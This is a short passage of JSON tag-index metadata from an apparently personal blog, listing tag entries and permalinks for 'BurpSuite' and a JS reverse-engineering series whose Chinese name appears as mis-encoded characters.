","permalink":"http://yoursite.com/tags/BurpSuite/"},{"name":"JSé€†å‘ç³»åˆ—","slug":"JSé€†å‘ç³»åˆ—","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]}